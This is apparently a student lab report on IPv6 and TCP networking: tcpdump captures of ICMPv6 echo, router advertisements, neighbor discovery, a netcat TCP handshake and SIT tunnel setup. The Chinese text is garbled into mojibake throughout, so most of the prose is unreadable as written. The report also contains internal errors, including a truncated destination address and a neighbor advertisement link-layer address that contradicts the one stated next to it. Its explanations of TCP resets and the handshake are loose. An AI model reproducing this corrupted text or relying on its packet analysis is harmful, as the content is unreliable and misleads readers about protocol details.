IPv6(ens5 scope:link) åœ°å€ and S çš„ IPv6(ens5 scope:linkï¼‰åœ°å€ -i ens5`ã€‚ HostA çš„ç»ˆç«¯ 2 ä¸­æ‰§è¡Œ `ping6 -c 1 S çš„ IPv6(ens5 scope:linkï¼‰åœ°å€%ens5`ã€‚ å‘½ä»¤è§£é‡Š sudo tcpdump -vxn host HostA çš„ IPv6(ens5 scope:link) åœ°å€ and S çš„ IPv6(ens5 scope:linkï¼‰åœ°å€ -i ens5 è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ä½¿ç”¨tcpdumpå·¥å…·æ¥æ•è·æŒ‡å®šä¸»æœºHostAå’Œå¦ä¸€å°ä¸»æœºSä¹‹é—´é€šè¿‡ens5ç½‘ç»œæ¥å£çš„IPv6é€šä¿¡æ•°æ®åŒ…ã€‚å…¶ä¸­-vé€‰é¡¹è¡¨ç¤ºä»¥è¯¦ç»†æ¨¡å¼æ˜¾ç¤ºæ•°æ®åŒ…ä¿¡æ¯ï¼Œ-xé€‰é¡¹è¡¨ç¤ºä»¥åå…­è¿›åˆ¶å’ŒASCIIå½¢å¼æ˜¾ç¤ºæ•°æ®åŒ…å†…å®¹ï¼Œ-né€‰é¡¹è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€è€Œä¸è¿›è¡Œåœ°å€è§£æï¼Œ-i ens5è¡¨ç¤ºæŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ä¸ºens5ã€‚\nping6 -c 1 S çš„ IPv6(ens5 scope:linkï¼‰åœ°å€%ens5 è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯å‘æŒ‡å®šçš„IPv6åœ°å€å‘é€ä¸€ä¸ªICMPv6 Echo Requestæ•°æ®åŒ…ï¼Œä»¥æµ‹è¯•ä¸ç›®æ ‡ä¸»æœºSçš„è¿é€šæ€§ã€‚å…¶ä¸­-c 1è¡¨ç¤ºåªå‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼ŒS çš„ IPv6(ens5 scope:linkï¼‰åœ°å€è¡¨ç¤ºç›®æ ‡ä¸»æœºSçš„IPv6åœ°å€ï¼Œ%ens5è¡¨ç¤ºæŒ‡å®šä½¿ç”¨ens5ç½‘ç»œæ¥å£å‘é€æ•°æ®åŒ…ã€‚\nç»“æœ ã€å®éªŒè¦æ±‚ã€‘ï¼šæ­¤æ­¥éª¤éœ€è¦è®°å½•ç»ˆç«¯ 1 ä¸­æŠ“åˆ°çš„ 2 ä¸ªæŠ¥æ–‡æ•°æ®ï¼Œè¡¨æ˜å“ªä¸ªæ˜¯è¯·æ±‚æŠ¥æ–‡ï¼Œå“ªä¸ªæ˜¯å›å¤æŠ¥æ–‡ã€‚æ ¹æ® IPv6 åè®®æŠ¥æ–‡æ ¼å¼åˆ†æä¸Šè¿° tcpdump æŠ“åŒ…ç»“æœï¼Œè¦æ±‚ç”»å‡º IPv6 ä»¥åŠ ICMPv6 çš„åŸºæœ¬æŠ¥å¤´ç»“æ„å¹¶å°†å„ä¸ªå­—æ®µåˆ†åˆ«å¡«å…¥å…¶ä¸­ (ä¾‹å¦‚ IP åè®®ç‰ˆæœ¬ã€æºåœ°å€å’Œç›®çš„åœ°å€ã€æºç«¯å£å’Œç›®çš„ç«¯å£ã€æŠ¥æ–‡å«ä¹‰ç­‰)ã€‚å¯¹è¿™ä¸ªæŠ¥æ–‡çš„å«ä¹‰åŠ ä»¥è§£é‡Šã€‚\nç¬¬ä¸€ä¸ªæŠ¥æ–‡æ˜¯è¯·æ±‚æŠ¥æ–‡ï¼Œç¬¬äºŒä¸ªæŠ¥æ–‡æ˜¯å›å¤æŠ¥æ–‡ã€‚\nç¬¬ä¸€ä¸ªæŠ¥æ–‡çš„IPv6æŠ¥å¤´å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 Version: 6 Traffic Class: 0 Flow Label: 0 Payload Length: 64 Next Header: ICMPv6 (58) Hop Limit: 64 Source Address: fe80::f816:3eff:fea7:a942 Destination Address: fe80::f816:3eff:fee7:f7b3 1 2 3 4 5 6 7 8 9 10 11 12 13 +-------------+----------------+------------+------------------+ | Version | Traffic Class | Flow Label | Payload Length | +-------------+----------------+------------+------------------+ | 6 | 0 | 0 | 64 | +-------------+----------------+------------+------------------+ | Next Header | Hop Limit | Source Address | +-------------+----------------+-------------------------------+ | 58 | 64 | fe80::f816:3eff:fea7:a942 | +---------------+----------------+-----------------------------+ | Destination Address | +--------------------------------------------------------------+ | fe80::f816:3eff:fee7:f7b3 | +--------------------------------------------------------------+ ICMPv6æŠ¥å¤´å¦‚ä¸‹ï¼š\n1 2 3 4 5 Type: ICMPv6 Echo Request (128) Code: 0 Checksum: 0x158e Identifier: 0x0001 Sequence Number: 1 ç¬¬äºŒä¸ªæŠ¥æ–‡çš„IPv6æŠ¥å¤´å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 +-------------+----------------+------------+------------------+ | Version | Traffic Class | Flow Label | Payload Length | +-------------+----------------+------------+------------------+ | 6 | 0 | 0 | 64 | +-------------+----------------+------------+------------------+ | Next Header | Hop Limit | Source Address | +-------------+----------------+-------------------------------+ | 58 | 64 | fe80::f816:3eff:fee7:f7b3 | +---------------+----------------+-----------------------------+ | Destination Address | +--------------------------------------------------------------+ | e80::f816:3eff:fea7:a942 | +--------------------------------------------------------------+ ICMPv6æŠ¥å¤´å¦‚ä¸‹ï¼š\n1 2 3 4 5 Type: ICMPv6 Echo Reply (129) Code: 0 Checksum: 0x0506 Identifier: 0x0001 Sequence Number: 1 æ ¹æ®ICMPv6æŠ¥æ–‡çš„ç±»å‹å’Œä»£ç ï¼Œå¯ä»¥åˆ¤æ–­ç¬¬ä¸€ä¸ªæŠ¥æ–‡æ˜¯ICMPv6 Echo RequestæŠ¥æ–‡ï¼Œç¬¬äºŒä¸ªæŠ¥æ–‡æ˜¯ICMPv6 Echo ReplyæŠ¥æ–‡ã€‚\nICMPv6 Echo RequestæŠ¥æ–‡ç”¨äºè¯·æ±‚å¯¹ç«¯å‘é€Echo ReplyæŠ¥æ–‡ã€‚ç¬¬ä¸€ä¸ªæŠ¥æ–‡çš„æºåœ°å€æ˜¯fe80::f816:3eff:fea7:a942ï¼Œç›®çš„åœ°å€æ˜¯fe80::f816:3eff:fee7:f7b3ã€‚åºåˆ—å·ä¸º1ï¼Œè¡¨ç¤ºè¿™æ˜¯ç¬¬ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡ã€‚\nICMPv6 Echo ReplyæŠ¥æ–‡ç”¨äºå“åº”ICMPv6 Echo RequestæŠ¥æ–‡ã€‚ç¬¬äºŒä¸ªæŠ¥æ–‡çš„æºåœ°å€æ˜¯fe80::f816:3eff:fee7:f7b3ï¼Œç›®çš„åœ°å€æ˜¯fe80::f816:3eff:fea7:a942ã€‚åºåˆ—å·ä¸º1ï¼Œè¡¨ç¤ºè¿™æ˜¯å¯¹ç¬¬ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡çš„å“åº” ä¸Šè¿°tcpdumpæŠ“åŒ…ç»“æœè¡¨æ˜ï¼Œä¸¤ä¸ªä¸»æœºä¹‹é—´æ­£åœ¨è¿›è¡ŒICMPv6 Echoæµ‹è¯•ã€‚\nè·¯ç”±å™¨å…¬å‘ŠæŠ¥æ–‡ è·¯ç”±å™¨å…¬å‘ŠæŠ¥æ–‡çš„ç›®çš„åœ°å€ä¸º IPv6 ç»„æ’­åœ°å€ä¸­çš„â€œå…¨èŠ‚ç‚¹åœ°å€â€ï¼Œå®ƒçš„åœ°å€æ˜¯FF02::1ï¼Œå¯ç”¨ tcpdump ä¾¦å¬è·¯ç”±å™¨å…¬å‘ŠæŠ¥æ–‡ã€‚HostA ä¸­å¦å¼€ä¸€ä¸ªç»ˆç«¯ 3 ç”¨äºä¾¦å¬è·¯ç”±å™¨å…¬å‘ŠæŠ¥æ–‡ï¼Œå‘½ä»¤ä¸ºï¼š sudo tcpdump â€“vxn host ff02::1 -i ens5\nã€å®éªŒè¦æ±‚ã€‘è®°å½• HostA çš„ç»ˆç«¯ 3 ä¸­ tcpdump æŠ“åŒ…å¾—åˆ°çš„æ•°æ®ã€‚ç”±äºè·¯ç”±å™¨å…¬å‘ŠæŠ¥æ–‡çš„å‘é€æœ‰ä¸€å®šåœ°å‘¨æœŸï¼Œå› æ­¤è¿™é‡Œå¯èƒ½éœ€è¦ç­‰å¾…è¾ƒé•¿æ—¶é—´ï¼Œå¯ä»¥æŠŠç»ˆç«¯ 3 æœ€å°åŒ–ç»§ç»­è¿›è¡Œå…¶ä»–å®éªŒï¼Œç­‰æœ‰ç»“æœåè®°å½•æŠ“åŒ…å¾—åˆ°çš„æ•°æ®ã€‚å¦‚ä»æœªé¡ºåˆ©æŠ“åˆ°æ­¤åŒ…ï¼Œä¹Ÿå¯ä»¥å‚è€ƒé™„å½•ä¸­çš„å›¾ 4 å›ç­”ä¸‹è¿°é—®é¢˜ã€‚æ ¹æ® tcpdump æŠ“å–åˆ°çš„æŠ¥æ–‡æ•°æ®è¯´æ˜è·¯ç”±å™¨é€šå‘ŠæŠ¥æ–‡é€šå‘Šäº†å“ªäº›ä¿¡æ¯å¹¶ç®€å•è§£é‡Šç½‘ç»œä¸­çš„å…¶å®ƒä¸»æœºå°†ä¼šå¦‚ä½•ä½¿ç”¨è¿™äº›ä¿¡æ¯ï¼Ÿ\nå‘½ä»¤è§£é‡Š è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ä½¿ç”¨tcpdumpå·¥å…·æ¥æ•è·å‘é€åˆ°IPv6ç»„æ’­åœ°å€ff02::1çš„æ•°æ®åŒ…ï¼Œè¯¥åœ°å€æ˜¯IPv6ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ç»„æ’­åœ°å€ã€‚å…¶ä¸­-vé€‰é¡¹è¡¨ç¤ºä»¥è¯¦ç»†æ¨¡å¼æ˜¾ç¤ºæ•°æ®åŒ…ä¿¡æ¯ï¼Œ-xé€‰é¡¹è¡¨ç¤ºä»¥åå…­è¿›åˆ¶å’ŒASCIIå½¢å¼æ˜¾ç¤ºæ•°æ®åŒ…å†…å®¹ï¼Œ-né€‰é¡¹è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€è€Œä¸è¿›è¡Œåœ°å€è§£æï¼Œ-i ens5è¡¨ç¤ºæŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ä¸ºens5ã€‚\nç»“æœ æ ¹æ® tcpdump æŠ“å–åˆ°çš„æŠ¥æ–‡æ•°æ®ï¼Œè·¯ç”±å™¨é€šå‘ŠæŠ¥æ–‡é€šå‘Šäº†ä»¥ä¸‹ä¿¡æ¯ï¼š\næºåœ°å€ï¼šfe80::f816:3eff:fee6:e881 ç›®æ ‡åœ°å€ï¼šff02::1 è·¯ç”±å‰ç¼€ï¼š2001:db8:85a3::/64 ç”Ÿå‘½å‘¨æœŸ ç½‘ç»œä¸­çš„å…¶å®ƒä¸»æœºå°†ä¼šä½¿ç”¨è¿™äº›ä¿¡æ¯æ¥è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š\nè·å–è·¯ç”±ä¿¡æ¯ï¼šä¸»æœºå¯ä»¥ä½¿ç”¨è·¯ç”±å‰ç¼€ä¿¡æ¯æ¥æ„å»ºè‡ªå·±çš„è·¯ç”±è¡¨ï¼Œä»è€Œèƒ½å¤Ÿå°†æ•°æ®åŒ…å‘é€åˆ°ç›®çš„ç½‘ç»œã€‚ è‡ªåŠ¨é…ç½®åœ°å€ï¼šå¦‚æœè·¯ç”±å™¨é€šå‘Šäº† M æ¯”ç‰¹ä¸º 1ï¼Œåˆ™ä¸»æœºå°†ä½¿ç”¨ DHCPv6 æœåŠ¡æ¥è·å– IPv6 åœ°å€ã€‚ å¯ç”¨ IPv6 é‚»å±…å‘ç°ï¼šä¸»æœºå¯ä»¥ä½¿ç”¨è·¯ç”±å™¨é€šå‘Šä¸­çš„é“¾è·¯å±‚é€‰é¡¹æ¥å¯ç”¨ IPv6 é‚»å±…å‘ç°ã€‚ åœ°å€è§£æ åœ°å€è§£æçš„ç›®çš„æ˜¯é€šè¿‡å¯¹ç«¯çš„ IP è·å–å¯¹ç«¯çš„ MAC åœ°å€ã€‚ç”±äºåœ°å€è§£æè¿‡ç¨‹ä¼šåœ¨æ•°æ®å‘é€å‰è‡ªåŠ¨è¿›è¡Œï¼Œå› æ­¤éœ€è¦å…ˆç”¨ tcpdump ä¾¦å¬ï¼Œå† ping å¯¹ç«¯ï¼Œå³å¯è§‚å¯Ÿåˆ°NS å’Œ NA æŠ¥æ–‡ã€‚\nHostA çš„ç»ˆç«¯ 1 æ‰§è¡Œå‘½ä»¤ sudo tcpdump -vxn host HostA çš„ IPv6(ens5 scope:link) åœ°å€ -i ens5 HostA çš„ç»ˆç«¯ 2 æ‰§è¡Œå‘½ä»¤ ping6 -c 1 HostB çš„ IPv6(ens5 scope:linkï¼‰åœ°å€%ens5ã€‚ å‘½ä»¤è§£é‡Š sudo tcpdump -vxn host HostA çš„ IPv6(ens5 scope:link) åœ°å€ -i ens5 è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ä½¿ç”¨tcpdumpå·¥å…·æ¥æ•è·å‘é€åˆ°ç‰¹å®šIPv6åœ°å€ï¼ˆHostAçš„IPv6åœ°å€ï¼Œens5æ¥å£ï¼Œscopeä¸ºlinkï¼‰çš„æ•°æ®åŒ…ï¼Œå…¶ä¸­-vé€‰é¡¹è¡¨ç¤ºä»¥è¯¦ç»†æ¨¡å¼æ˜¾ç¤ºæ•°æ®åŒ…ä¿¡æ¯ï¼Œ-xé€‰é¡¹è¡¨ç¤ºä»¥åå…­è¿›åˆ¶å’ŒASCIIå½¢å¼æ˜¾ç¤ºæ•°æ®åŒ…å†…å®¹ï¼Œ-né€‰é¡¹è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€è€Œä¸è¿›è¡Œåœ°å€è§£æï¼Œ-i ens5è¡¨ç¤ºæŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ä¸ºens5ã€‚\nping6 -c 1 HostB çš„ IPv6(ens5 scope:linkï¼‰åœ°å€%ens5ã€‚ è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯å‘æŒ‡å®šçš„IPv6åœ°å€ï¼ˆHostBçš„IPv6åœ°å€ï¼Œens5æ¥å£ï¼Œscopeä¸ºlinkï¼‰å‘é€ä¸€ä¸ªICMPv6æ•°æ®åŒ…ï¼Œ-c 1è¡¨ç¤ºåªå‘é€ä¸€ä¸ªæ•°æ®åŒ…ã€‚åœ¨IPv6åœ°å€åé¢åŠ ä¸Š%ens5æ˜¯ä¸ºäº†æŒ‡å®šæ•°æ®åŒ…é€šè¿‡ens5æ¥å£å‘é€ã€‚\nç»“æœ ã€å®éªŒè¦æ±‚ã€‘ï¼šè®°å½• HostA çš„ç»ˆç«¯ 1 ä¸­è§‚å¯Ÿåˆ°é‚»å±…è¯·æ±‚ (NS) å’Œé‚»å±…é€šå‘Š (NA) æŠ¥æ–‡ã€‚æ ¹æ®æŠ“å–åˆ°çš„æŠ¥æ–‡æ•°æ®è¯´æ˜é‚»å±…è¯·æ±‚åŠé‚»å±…å…¬å‘ŠæŠ¥æ–‡é€šå‘Šäº†å“ªäº›ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ\nä»æŠ“å–åˆ°çš„æŠ¥æ–‡æ•°æ®æ¥çœ‹ï¼Œé‚»å±…è¯·æ±‚ (NS) æŠ¥æ–‡é€šå‘Šäº†ä»¥ä¸‹ä¿¡æ¯ï¼š\næºåœ°å€ï¼šfe80::f816:3eff:fea7:a942 ç›®æ ‡åœ°å€ï¼šfe80::f816:3eff:fee7:1aea è¯·æ±‚ç±»å‹ï¼šWho has è¿™äº›ä¿¡æ¯ç”¨äºæŸ¥è¯¢ç›®æ ‡åœ°å€çš„é‚»å±…èŠ‚ç‚¹ã€‚\né‚»å±…é€šå‘Š (NA) æŠ¥æ–‡é€šå‘Šäº†ä»¥ä¸‹ä¿¡æ¯ï¼š\næºåœ°å€ï¼šfe80::f816:3eff:fee7:1aea ç›®æ ‡åœ°å€ï¼šfe80::f816:3eff:fea7:a942 é“¾è·¯å±‚åœ°å€ï¼šfa:16:3e:5b:1a:ea å¯è¾¾æ€§ï¼šå¯è¾¾ è¿™äº›ä¿¡æ¯ç”¨äºå‘ŠçŸ¥æºåœ°å€ï¼Œç›®æ ‡åœ°å€æ˜¯å¯è¾¾çš„ï¼Œå¹¶ä¸”ç›®æ ‡åœ°å€çš„é“¾è·¯å±‚åœ°å€æ˜¯ fa:16:3e:e7:f7:b3ã€‚ TCP ä¸‰æ¬¡æ¡æ‰‹ netcat å¯ä»¥åœ¨ä¸»æœºé—´å»ºç«‹ TCP è¿æ¥ï¼Œå»ºç«‹è¿æ¥æ—¶ï¼Œå¯ä»¥ç”¨ tcpdump å¯¹ æŠ¥æ–‡æŠ“åŒ…ï¼Œè§‚å¯Ÿåˆ° TCP çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚\né¦–å…ˆåœ¨ S çš„ç»ˆç«¯ 1 ä¸­æ‰§è¡Œ nc -l 1958 ä¾¦å¬ 1958 ç«¯å£ã€‚\nä¹‹ååœ¨ HostA çš„ç»ˆç«¯1 æ‰§è¡Œ sudo tcpdump -vxn host HostA çš„ IPv4(ens5) åœ°å€ andS çš„ IPv4(ens5) åœ°å€ -i ens5\nåœ¨HostA çš„ç»ˆç«¯2 æ‰§è¡Œ nc S çš„IPv4(ens5)åœ°å€ 1958ã€‚\nå‘½ä»¤è§£é‡Š nc -l 1958ï¼šè¿™ä¸ªå‘½ä»¤ä½¿ç”¨ncï¼ˆnetcatï¼‰å·¥å…·åœ¨æœ¬åœ°ç›‘å¬1958ç«¯å£ï¼Œç­‰å¾…æ¥æ”¶æ•°æ®ã€‚ sudo tcpdump -vxn host HostA çš„ IPv4(ens5) åœ°å€ andS çš„ IPv4(ens5) åœ°å€ -i ens5ï¼šè¿™ä¸ªå‘½ä»¤æ˜¯ç”¨æ¥ä½¿ç”¨tcpdumpå·¥å…·æ¥æ•è·ç½‘ç»œæ•°æ®åŒ…çš„å‘½ä»¤ã€‚å…¶ä¸­\u0026quot;-v\u0026quot;è¡¨ç¤ºè¯¦ç»†æ¨¡å¼ï¼Œ\u0026quot;-x\u0026quot;è¡¨ç¤ºä»¥åå…­è¿›åˆ¶å’ŒASCIIæ ¼å¼æ˜¾ç¤ºæ•°æ®åŒ…ï¼Œ\u0026quot;-n\u0026quot;è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€ï¼Œ\u0026quot;-i ens5\u0026quot;è¡¨ç¤ºç›‘å¬ç½‘ç»œæ¥å£ens5ä¸Šçš„æ•°æ®åŒ…ã€‚\u0026ldquo;host HostA çš„ IPv4(ens5) åœ°å€ andS çš„ IPv4(ens5) åœ°å€\u0026quot;è¿™éƒ¨åˆ†åº”è¯¥æ˜¯è¦æŒ‡å®šè¦æ•è·çš„æ•°æ®åŒ…çš„æºå’Œç›®æ ‡ä¸»æœºçš„IPåœ°å€ã€‚ nc S çš„IPv4(ens5)åœ°å€ 1958ï¼šè¿™ä¸ªå‘½ä»¤ä½¿ç”¨ncï¼ˆnetcatï¼‰å·¥å…·æ¥è¿æ¥åˆ°æŒ‡å®šçš„IPv4åœ°å€çš„ä¸»æœºçš„1958ç«¯å£ã€‚ ç»“æœ ã€å®éªŒè¦æ±‚ã€‘ï¼šå®Œæ•´è®°å½• HostA çš„ç»ˆç«¯ 1 ä¸­è§‚å¯Ÿåˆ°çš„å‰ä¸‰ä¸ªæŠ¥æ–‡ï¼Œå³ TCP æ¡æ‰‹æŠ¥æ–‡ã€‚æ ‡æ³¨å‡ºæ¯ä¸ªæŠ¥æ–‡çš„ç±»å‹ï¼ˆSYNã€SYN/ACKã€ACKï¼‰ã€‚ç®€è¦è¯´æ˜ TCP åè®®é‡‡ç”¨ä¸‰æ¬¡æ¡æ‰‹çš„åŸå› ã€‚è¯´æ˜å®éªŒä¸­ä¸ºä½•æ— æ³•æŠ“åˆ° RST åŒ…ï¼Ÿè¯·é—®ç¼–å†™åº”ç”¨ç¨‹åºæ—¶æˆ‘ä»¬æ˜¯å¦éœ€è¦å¤„ç†è¿™äº›æŠ¥æ–‡ï¼Œä¸ºä»€ä¹ˆï¼Ÿ\nTCP åè®®é‡‡ç”¨ä¸‰æ¬¡æ¡æ‰‹çš„åŸå› \nç¡®ä¿è¿æ¥çš„å»ºç«‹æ˜¯å¯é çš„ã€‚ é¿å…å·²å»ºç«‹çš„è¿æ¥è¢«é‡å¤å»ºç«‹ã€‚ é¿å…è¿æ¥è¢«æ¶æ„æ”»å‡»ã€‚ åœ¨ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ–¹ä¸»æœºå„å‘é€ä¸€ä¸ª SYN æŠ¥æ–‡ï¼Œç„¶åå†å„å‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ã€‚è¿™æ ·ï¼ŒåŒæ–¹ä¸»æœºå°±å¯ä»¥ç¡®è®¤å¯¹æ–¹æ˜¯å¯é çš„ï¼Œå¹¶ä¸”è¿æ¥æ˜¯å¯é çš„ã€‚\nå®éªŒä¸­æ— æ³•æŠ“åˆ° RST åŒ…çš„åŸå› \nåœ¨å®éªŒä¸­ï¼ŒHostA å’Œ HostB å»ºç«‹äº† TCP è¿æ¥ï¼Œå¹¶å¼€å§‹ä¼ è¾“æ•°æ®ã€‚å¦‚æœ HostA æˆ– HostB æƒ³è¦ç»ˆæ­¢è¿æ¥ï¼Œåˆ™ä¼šå‘é€ RST åŒ…ã€‚ä½†æ˜¯ï¼Œç”±äºå®éªŒä¸­æˆ‘ä»¬æ²¡æœ‰ç»ˆæ­¢è¿æ¥ï¼Œå› æ­¤æ— æ³•æŠ“åˆ° RST åŒ…ã€‚\nå¦‚æœ HostA å‘é€äº†ä¸€ä¸ªæ— æ•ˆçš„ TCP æŠ¥æ–‡ï¼Œæˆ–è€… HostB æ‹’ç»å»ºç«‹è¿æ¥ï¼Œåˆ™ HostB å¯èƒ½ä¼šå‘é€ RST åŒ…æ¥ç»ˆæ­¢è¿æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ tcpdump æ¥æŠ“åˆ° RST åŒ…ã€‚\nç¼–å†™åº”ç”¨ç¨‹åºæ—¶æ˜¯å¦éœ€è¦å¤„ç†è¿™äº›æŠ¥æ–‡\nç¼–å†™åº”ç”¨ç¨‹åºæ—¶ï¼Œé€šå¸¸ä¸éœ€è¦ç›´æ¥å¤„ç† TCP æ¡æ‰‹æŠ¥æ–‡ã€‚åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡è°ƒç”¨ç³»ç»Ÿ API æ¥å»ºç«‹å’Œç®¡ç† TCP è¿æ¥ã€‚\néš§é“ æ³¨æ„ éš§é“åˆ é™¤å‘½ä»¤ä¸º ip tunnel del éš§é“åç§°ï¼Œè‹¥æ·»åŠ éš§é“å‘½ä»¤æ‰“é”™å¯ç”¨æ­¤å‘½ä»¤åˆ é™¤åé‡å»ºã€‚\næ‰“å¼€ä¸¤ä¸ª Host è™šæ‹Ÿæœºå¹¶å„æ‰“å¼€ä¸€ä¸ªç»ˆç«¯ åœ¨ HostA çš„ç»ˆç«¯ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š sudo ip tunnel add sit1 mode sit remote HostB çš„ IPv4 åœ°å€ local HostA çš„ IPv4 åœ°å€ dev ens5ï¼ˆIPv4 åœ°å€å¯ä»¥ç”±å‘½ä»¤ ifconfig ens5 è·å¾—ï¼‰\nsudo ip link set sit1 up\nip link show upã€è®°å½•ç»“æœï¼Œæ­¤æ—¶å¯ä»¥çœ‹åˆ°åå­—ä¸º sit1 çš„è®¾å¤‡ã€‘ sudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1\nip tunnel showã€è®°å½•ç»“æœã€‘ å‘½ä»¤è§£é‡Š sudo ip tunnel add sit1 mode sit remote HostB çš„ IPv4 åœ°å€ local HostA çš„ IPv4 åœ°å€ dev ens5ï¼šè¯¥å‘½ä»¤ç”¨äºåˆ›å»ºä¸€ä¸ªåä¸º sit1 çš„éš§é“æ¥å£ï¼Œè¯¥éš§é“æ¥å£çš„æ¨¡å¼ä¸º SITï¼Œè¿œç¨‹ç«¯åœ°å€ä¸º HostB çš„ IPv4 åœ°å€ï¼Œæœ¬åœ°ç«¯åœ°å€ä¸º HostA çš„ IPv4 åœ°å€ï¼Œéš§é“æ¥å£ç»‘å®šçš„ç‰©ç†æ¥å£ä¸º ens5ã€‚\nsudo ip link set sit1 upï¼šHostA å·²ç»åˆ›å»ºäº†åä¸º sit1 çš„éš§é“æ¥å£ï¼Œä½†è¯¥éš§é“æ¥å£å¤„äºç¦ç”¨çŠ¶æ€ã€‚é€šè¿‡æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œå°† sit1 éš§é“æ¥å£ç½®ä¸ºå¯ç”¨çŠ¶æ€ã€‚\nip link show å‘½ä»¤ç”¨äºæ˜¾ç¤ºç³»ç»Ÿçš„ç½‘ç»œæ¥å£ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶å½“å‰çŠ¶æ€ã€‚up é€‰é¡¹åªæ˜¾ç¤ºå½“å‰å·²å¯ç”¨çš„ç½‘ç»œæ¥å£ã€‚\nsudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1 ï¼šè¯¥å‘½ä»¤ç”¨äºå°† IPv6 åœ°å€ 3ffe:3216:2101:2106:1234::A åˆ†é…ç»™éš§é“æ¥å£ sit1ï¼Œå‰ç¼€é•¿åº¦ä¸º 80\nip tunnel show ç”¨äºæ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰éš§é“æ¥å£çš„ä¿¡æ¯ã€‚\nåœ¨ HostB çš„ç»ˆç«¯ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š sudo ip tunnel add sit1 mode sit remote HostA çš„ IPv4 åœ°å€ local HostB çš„ IPv4 åœ°å€ dev ens5ï¼ˆIPv4 åœ°å€å¯ä»¥ç”±å‘½ä»¤ ifconfig ens5 è·å¾—ï¼‰\nsudo ip link set sit1 up\nip link show upã€è®°å½•ç»“æœï¼Œæ­¤æ—¶å¯ä»¥çœ‹åˆ°åå­—ä¸º sit1 çš„è®¾å¤‡ã€‘ sudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1\nip tunnel showã€è®°å½•ç»“æœã€‘ å‘½ä»¤è§£é‡Š sudo ip tunnel add sit1 mode sit remote HostA çš„ IPv4 åœ°å€ local HostB çš„ IPv4 åœ°å€ dev ens5 ç”¨äºåˆ›å»ºä¸€ä¸ªåä¸º sit1 çš„éš§é“æ¥å£ã€‚è¯¥éš§é“æ¥å£ä½¿ç”¨ SIT æ¨¡å¼ï¼Œè¿œç¨‹ç«¯åœ°å€ä¸º HostA çš„ IPv4 åœ°å€ï¼Œæœ¬åœ°ç«¯åœ°å€ä¸º HostB çš„ IPv4 åœ°å€ã€‚éš§é“æ¥å£ç»‘å®šåˆ°ç‰©ç†æ¥å£ ens5ã€‚\nsudo ip link set sit1 up ï¼šé€šè¿‡æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œå°† sit1 éš§é“æ¥å£ç½®ä¸ºå¯ç”¨çŠ¶æ€ã€‚\nip link show å‘½ä»¤ç”¨äºæ˜¾ç¤ºç³»ç»Ÿçš„ç½‘ç»œæ¥å£ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶å½“å‰çŠ¶æ€ã€‚up é€‰é¡¹åªæ˜¾ç¤ºå½“å‰å·²å¯ç”¨çš„ç½‘ç»œæ¥å£ã€‚\nsudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1 ç”¨äºå°† IPv6 åœ°å€ 3ffe:3216:2101:2106:1234::B åˆ†é…ç»™éš§é“æ¥å£ sit1ï¼Œå‰ç¼€é•¿åº¦ä¸º 80ã€‚\nip tunnel show ç”¨äºæ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰éš§é“æ¥å£çš„ä¿¡æ¯ã€‚\nåœ¨ HostA ä¸Šæ‰“å¼€ä¸¤ä¸ªç»ˆç«¯ã€‚ å…¶ä¸­ä¸€ä¸ªç»ˆç«¯ç”¨ tcpdump ä¾¦å¬æŠ¥æ–‡ï¼Œå¦ä¸€ä¸ªç»ˆç«¯ç”¨äº ping6ã€‚\né¦–å…ˆåœ¨ HostA çš„ç¬¬ 1 ä¸ªç»ˆç«¯ä¸­æ‰§è¡Œå‘½ä»¤ sudo tcpdump -vxn -i sit1ã€‚\nå…¶æ¬¡åœ¨ HostA çš„ç¬¬ 2 ä¸ªç»ˆç«¯ä¸­æ‰§è¡Œå‘½ä»¤ ping6 â€“c 1 3ffe:3216:2101:2106 :1234::Bï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥ ping é€šï¼Œè‹¥ä¸é€šåˆ™éœ€è¦æ£€æŸ¥ä¹‹å‰çš„æ­¥éª¤æ˜¯å¦æ­£ç¡®å®Œæˆã€‚ è®°å½• HostA çš„ç¬¬ 1 ä¸ªç»ˆç«¯ä¸­ç”± tcpdump æŠ“å–çš„å‰ä¸¤ä¸ªæŠ¥æ–‡ã€‚ å…³é—­ HostA 